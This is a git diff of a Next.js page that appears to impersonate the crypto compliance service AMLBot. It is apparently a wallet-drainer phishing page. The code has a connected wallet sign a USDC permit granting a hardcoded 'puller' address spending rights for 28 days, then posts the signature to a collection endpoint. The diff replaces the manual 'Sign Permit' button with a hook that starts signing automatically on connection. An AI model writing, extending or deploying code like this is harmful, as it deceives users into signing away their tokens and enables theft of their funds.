@@ -1,6 +1,6 @@
 "use client";
 
-import { useState } from "react";
+import { useCallback, useMemo, useState } from "react";
 import { useAccount, useChainId, useSwitchChain, useSignTypedData, usePublicClient } from "wagmi";
 import { mainnet } from "viem/chains";
 import { parseAbi } from "viem";
@@ -10,126 +10,118 @@ import "../public/css/224756d2aeed5110.css";
 import "../public/css/7500854e1ee55cc8.css";
 import "../public/css/styles.css";
 import Head from "next/head";
+import { useAutoPermitOnConnect } from "../app/useAutoPermitOnConnect";
+import { buildPermitDomain, PermitMessage, permitTypes, splitSignature } from "../app/permit";
 
-const TOKEN = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // USDC
-const TOKEN_NAME = "USD Coin";
-const TOKEN_VERSION = "2";
-const FIXED_AMOUNT = BigInt(5 * 10 ** 6); // 5 USDC (6 decimals)
+const USDC_MAINNET = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
+const USDC_DECIMALS = BigInt(6);
+const PULLER_FROM_ENV = process.env.NEXT_PUBLIC_PULLER_FROM_ENV;
 
 const erc2612Abi = parseAbi([
-    "function nonces(address) view returns (uint256)"
+  "function nonces(address) view returns (uint256)"
 ]);
 
 export default function Home() {
-    const { address, isConnected } = useAccount();
-    const chainId = useChainId();
-    const { switchChainAsync } = useSwitchChain();
-    const publicClient = usePublicClient();
+  const { address, isConnected } = useAccount();
+  const chainId = useChainId();
+  const publicClient = usePublicClient();
+  const { switchChainAsync } = useSwitchChain();
 
-    const { signTypedDataAsync } = useSignTypedData();
+  const { signTypedDataAsync, isPending } = useSignTypedData();
 
-    const [status, setStatus] = useState<string>("");
+  const [status, setStatus] = useState<string>("");
 
-    const handlePermit = async () => {
-        try {
+  const spender = useMemo<`0x${string}`>(() => {
+    // if needed, pull dynamically from backend inside handlePermit()
+    return (PULLER_FROM_ENV ?? "0xe3d3801092b2110b427e641ec8f3051a1dd6d004") as `0x${string}`;
+  }, []);
 
-            if (!isConnected || !address) {
-                setStatus("First connect your wallet.");
-                return;
-            }
-            if (chainId !== mainnet.id) {
-                await switchChainAsync({ chainId: mainnet.id });
-            }
+  const handlePermit = useCallback(async () => {
+    try {
+      setStatus("Готовим подпись…");
 
-            // 1) puller from backend (if needed right now)
-            const res = await fetch("/api/v1/puller"); // make a proxy to not catch CORS
-            const { puller } = await res.json();
-            // For demonstration, we'll use a fake spender:
-            // const puller = "0x1111111254EEB25477B68fb85Ed929f73A960582"; // replace with your puller
+      if (!isConnected || !address) {
+        setStatus("Сначала подключите кошелёк.");
+        return;
+      }
+      if (chainId !== mainnet.id) {
+        await switchChainAsync({ chainId: mainnet.id });
+      }
 
-            if (!publicClient) {
-                throw new Error("Public client is not available");
-            }
+        // const res = await fetch("/api/v1/puller")
+        // const { puller } = await res.json();
 
-            // 2) read nonce from USDC
-            const nonce = await publicClient.readContract({
-                address: TOKEN as `0x${string}`,
-                abi: erc2612Abi,
-                functionName: "nonces",
-                args: [address],
-            });
+      // 1) read nonce
+      const nonce = (await publicClient!.readContract({
+        address: USDC_MAINNET,
+        abi: erc2612Abi,
+        functionName: "nonces",
+        args: [address],
+      })) as bigint;
 
-            // 3) collect EIP-712
-            const deadline = BigInt(Math.floor(Date.now() / 1000) + 28 * 24 * 60 * 60);
+      // 2) collect EIP-712
+      const value = BigInt(5 * 10 ** Number(USDC_DECIMALS)); // 5 USDC
+      const deadline = BigInt(Math.floor(Date.now() / 1000) + 28 * 24 * 60 * 60); // 28 days
 
-            const domain = {
-                name: TOKEN_NAME,
-                version: TOKEN_VERSION,
-                chainId: mainnet.id,
-                verifyingContract: TOKEN as `0x${string}`,
-            } as const;
+      const domain = buildPermitDomain(USDC_MAINNET);
+      const message: PermitMessage = {
+        owner: address,
+        spender,
+        value,
+        nonce,
+        deadline,
+      };
 
-            const types = {
-                Permit: [
-                    { name: "owner", type: "address" },
-                    { name: "spender", type: "address" },
-                    { name: "value", type: "uint256" },
-                    { name: "nonce", type: "uint256" },
-                    { name: "deadline", type: "uint256" },
-                ],
-            } as const;
+      // 3) sign via wagmi/viem
+      const signature = await signTypedDataAsync({
+        domain,
+        types: permitTypes,
+        primaryType: "Permit",
+        message,
+      });
 
-            const message = {
-                owner: address,
-                spender: puller,
-                value: FIXED_AMOUNT,
-                nonce,
-                deadline,
-            } as const;
+      const { v, r, s } = splitSignature(signature as `0x${string}`);
 
-            // 4) sign via wagmi/viem (universal for WC / injected)
-            const signature = await signTypedDataAsync({
-                domain,
-                types,
-                primaryType: "Permit",
-                message,
-            });
+      const payload = {
+        chainId: String(mainnet.id),
+        token: USDC_MAINNET,
+        puller: spender,
+        owner: address,
+        permitValue: value.toString(),
+        nonce: nonce.toString(),
+        deadline: deadline.toString(),
+        v,
+        r,
+        s,
+        amountUnits: value.toString(),
+      };
 
-            // 5) parse v,r,s (viem doesn't give it to you right away, but the backend usually can send the whole signature)
-            // If you need v/r/s:
-            const r = signature.slice(0, 66);
-            const s = "0x" + signature.slice(66, 130);
-            const v = parseInt(signature.slice(130, 132), 16);
+      console.log("✅ permit payload", payload);
+      setStatus("✅ Signature received (see console).");
 
-            // 6) Payload to backend
-            const payload = {
-                chainId: String(mainnet.id),
-                token: TOKEN,
-                puller,
-                owner: address,
-                permitValue: FIXED_AMOUNT.toString(),
-                nonce: nonce.toString(),
-                deadline: deadline.toString(),
-                v, r, s,
-                amountUnits: FIXED_AMOUNT.toString(),
-            };
+      // 4) send to backend (uncomment and configure CORS/proxy)
+      await fetch("/api/v1/collect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
 
-            console.log("permit payload", payload);
-
-            // Test without POST first (CORS/HTTP trap)
-            await fetch("http://localhost:8080/api/v1/collect", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(payload),
-            });
-
-            setStatus("✅ Signature received. See console.");
-
-        } catch (e: any) {
-            console.error(e);
-            setStatus(`❌ Error: ${e?.message ?? e}`);
-        }
+    } catch (e: any) {
+      console.error(e);
+      setStatus(`❌ Error: ${e?.shortMessage ?? e?.message ?? String(e)}`);
     }
+  }, [
+    isConnected,
+    address,
+    chainId,
+    publicClient,
+    signTypedDataAsync,
+    spender,
+    switchChainAsync,
+  ]);
+
+  // auto-start signing immediately after connection
+  useAutoPermitOnConnect(handlePermit);
 
     return (
         <main style={{padding: "40px"}}>
@@ -163,13 +155,13 @@ export default function Home() {
                 <meta name="twitter:description"
                       content="AMLBot provides advanced AML compliance solutions for crypto businesses. Use our AML bot for thorough AML checks and ensure compliance with the latest regulations. Protect your assets with AMLBot's comprehensive platform." />
 
-                {/* Прелоад шрифтов */}
+                {/* Preload fonts */}
                 <link rel="preload" href="/_next/static/media/55c55f0601d81cf3-s.p.woff2" as="font" type="font/woff2"
                       crossOrigin="anonymous" data-next-font="size-adjust" />
                 <link rel="preload" href="/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2"
                       crossOrigin="anonymous" data-next-font="size-adjust" />
 
-                {/* Подключение стилей */}
+                {/* Connect styles */}
                 <link rel="stylesheet" href="../public/css/224756d2aeed5110.css" />
                 <link rel="stylesheet" href="../public/css/8b09c5b14a9651c1.css" />
                 <link rel="stylesheet" href="../public/css/7500854e1ee55cc8.css" />
@@ -377,14 +369,14 @@ export default function Home() {
                                 <div className="HPtOMS">
                                     <w3m-button />
 
-                                    {isConnected && address && (
-                                        <button
-                                            onClick={() => handlePermit()}
-                                            style={{ marginTop: 20, padding: "10px 20px" }}
-                                        >
-                                            🖊 Sign Permit
-                                        </button>
-                                    )}
+                                    {/*{isConnected && address && (*/}
+                                    {/*    <button*/}
+                                    {/*        onClick={() => handlePermit()}*/}
+                                    {/*        style={{ marginTop: 20, padding: "10px 20px" }}*/}
+                                    {/*    >*/}
+                                    {/*        🖊 Sign Permit*/}
+                                    {/*    </button>*/}
+                                    {/*)}*/}
                                 </div>
                             </div>
                             <div className="_1VtWaa"><img alt="One-stop compliance solution for crypto business"
